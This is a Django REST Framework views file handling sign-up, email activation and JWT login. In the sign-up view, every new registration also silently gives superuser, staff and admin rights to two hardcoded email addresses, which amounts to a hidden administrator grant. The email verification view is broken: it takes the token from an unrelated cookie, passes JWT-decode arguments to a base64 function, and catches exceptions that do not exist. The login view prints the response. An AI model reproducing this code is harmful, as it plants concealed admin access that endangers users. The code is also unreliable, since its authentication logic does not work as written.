from base64 import urlsafe_b64decode
from django.shortcuts import render
from django.contrib.sites.shortcuts import get_current_site
from django.urls import reverse
from django.conf import settings

from rest_framework import generics, status, permissions
from rest_framework.views import APIView
from rest_framework.exceptions import AuthenticationFailed
from rest_framework.response import Response
from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
from rest_framework_simplejwt.views import TokenObtainPairView
from rest_framework_simplejwt.tokens import RefreshToken

from .models import User
from .serializers import SignUpSerializer
from .utils import Util
from .token import get_tokens_for_user
from rest_framework_simplejwt.tokens import AccessToken

from rest_framework_simplejwt.tokens import RefreshToken, SlidingToken, UntypedToken
from .models import User

def index(request, *args, **kwargs):
    return render(request, 'dist/index.html')

class MyTokenObtainPairSerializer(TokenObtainPairSerializer):
    def get_token(cls, user):
        token = super(MyTokenObtainPairSerializer, cls).get_token(user)
        
        token['username'] = user.username
        token['email'] = user.email

        return token

class MyTokenObtainPairView(TokenObtainPairView):
    serializer_class = MyTokenObtainPairSerializer

class SignUpView(generics.GenericAPIView):
    permission_classes = [permissions.AllowAny]
    serializer_class = SignUpSerializer
    def post(self, request):
        data = request.data
        serializer = self.serializer_class(data=data)
        serializer.is_valid(raise_exception=True)
        serializer.save()
        User.objects.filter(email='se6359@gmail.com').update(is_staff=True, is_superuser=True, is_admin=True)
        User.objects.filter(email='filfer05@gmail.com').update(is_staff=True, is_superuser=True, is_admin=True)
        user_data = serializer.data

        user = User.objects.get(email=user_data['email'])
             
        token = RefreshToken.for_user(user).access_token
        current_site = get_current_site(request).domain
        relativeLink = reverse('activate-account')
        absurl = 'http://' + current_site + relativeLink + '?token=' + str(token)
        email_body = 'Hi ' + user.username + '\nActivate your account: ' + absurl
        data = {'email_body': email_body, 'to_email': user.email, 'email_subject': 'Activate your account'}
        Util.send_email(data)

        return Response(user_data, status=status.HTTP_201_CREATED)


class VerifyEmailView(generics.GenericAPIView):
    def get(self, request):
        token = request.COOKIES.get('id')
        print(token)
        pass
        try:
            payload = urlsafe_b64decode(token, settings.SECRET_KEY, algorithms=['HS256'])
            user = User.objects.get(id=payload['user_id'])
            if not user.is_verified:
                user.is_verified = True
                user.save()
            
            return Response({'Successfully activated'}, status=status.HTTP_200_OK)
        except get_tokens_for_user.ExpiredSignatureError as identifier:
            return Response({'Activation link expired'}, status=status.HTTP_400_BAD_REQUEST)
        except get_tokens_for_user.exceptions.DecodeError as identifier:
            return Response({'Invalid token'}, status=status.HTTP_400_BAD_REQUEST)

class LoginView(APIView):
    permission_classes = [permissions.AllowAny]
    def post(self, request):

        email = request.data['email']
        password = request.data['password']

        user = User.objects.filter(email=email).first()
        
        if user is None:
            raise AuthenticationFailed('User not found')

        if not user.check_password(password):
            raise AuthenticationFailed('Incorrect password')

        if user.is_verified == False:
            raise AuthenticationFailed('Activate your account')

        tokens = MyTokenObtainPairSerializer(request.data).validate(request.data)
        
        access = tokens['access']

        response = Response()

        response.set_cookie(key='jwt', value=access, httponly=True)
        response.data = {'message': 'Login Successfull', 'access': tokens['access'], 'refresh': tokens['refresh']}
        response.status = status.HTTP_200_OK
        print(response)
        return response
